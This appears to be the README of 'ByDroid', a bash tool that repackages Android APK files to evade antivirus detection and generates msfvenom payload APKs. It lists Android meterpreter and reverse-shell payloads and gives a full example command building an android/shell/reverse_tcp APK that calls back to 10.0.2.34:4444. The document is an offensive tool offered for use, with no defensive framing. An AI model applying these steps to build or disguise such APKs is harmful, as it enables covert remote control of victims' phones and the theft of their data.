# ByDroid
A simple bash script for edit Android APK files and evade AVs changing the package

## Usage
```
bydroid.sh [OPTIONS] package [file]
OPTIONS:
  -h, --help          show help message
  -g, --generate      generate an apk with msfvenom (requires: -P, -l, -p)
  -P, --payload       set the payload for msfvenom (see below)
  -l, --lhost         set the lhost for msfvenom payload
  -p, --port          set the port for msfvenom payload
  -n, --name          change the app name (not implemented yet)
  -i, --icon          change the app icon (not implemented yet)
  -o, --output        select the output file
```

The `package` parameter means the new package for the app.

The `file` parameter is the input file to patch (ignored when use `-g`).

### Payloads
```
android/meterpreter/reverse_http
android/meterpreter/reverse_https
android/meterpreter/reverse_tcp
android/shell/reverse_http
android/shell/reverse_https
android/shell/reverse_tcp
```

## Dependencies
- msfvenom            (_only when use `-g`_)  https://github.com/rapid7/metasploit-framework
- apktool                                     https://ibotpeaches.github.io/Apktool/
- d2j-apk-sign                                http://repository-dex2jar.forge.cloudbees.com/snapshot/com/googlecode/d2j/dex-tools/2.1-SNAPSHOT/

_All of them included in Kali Linux_

## TODO
- [ ] Function -n (change name)
- [ ] Function -i (change icon)
- [ ] List missing dependencies
- [ ] Prompt for bin location when not found

## EXAMPLES

`bydroid.sh com.new.package app.apk`

Changes the package of `app.apk` to `com.new.package` and gives an output file `out.apk`

`bydroid.sh com.new.package app.apk -o edited.apk -n "New Name" -i ~/images/icon.png`

Changes the package to `com.new.package`, the name of the app to `New Name` and the icon with the selected image, and gives the output file `edited.apk`

`bydroid.sh com.new.package -g -P android/shell/reverse_tcp -l 10.0.2.34 -p 4444 -o payload.apk`

Generates a payload `android/shell/reverse_tcp` which connects to `10.0.2.34:4444` and gives the output file `payload.apk`


